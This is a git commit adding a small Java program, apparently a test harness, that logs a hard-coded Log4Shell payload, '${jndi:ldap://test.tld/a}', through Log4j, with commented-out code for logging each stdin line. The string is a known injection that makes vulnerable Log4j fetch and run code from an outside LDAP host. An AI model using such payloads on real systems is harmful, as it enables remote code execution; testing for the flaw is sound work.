a3185fab14c2309f05867dbc50ed2d35febf9536
jet <jet@amber.lani>
2022-01-13 20:54:06 +0200

    initial commit

---
+++ log4stdin/src/main/java/io/ajuvonen/log4stdin/log4stdin.java
@@ -0,0 +1,33 @@
+package io.ajuvonen.log4stdin;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class log4stdin 
+{
+
+    private static final Logger log = LogManager.getLogger("HelloWorld");
+
+    public static void main(String[] args) {
+        // System.out.println("----- printStdout started -------");
+        log.info("${jndi:ldap://test.tld/a}");
+        
+        // try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
+        // String line = null;
+        // while (true) {
+        //     if ((line = reader.readLine()) != null) {
+        //     // System.out.println(line);
+        //     log.info(line);
+        //     } else {
+        //         //input finishes
+        //         // System.out.println("----- input end -------");
+        //     break;
+        //     }
+        // }
+        // } catch (Exception e) {
+        //     System.err.println(e);
+        // }
+    }
+}
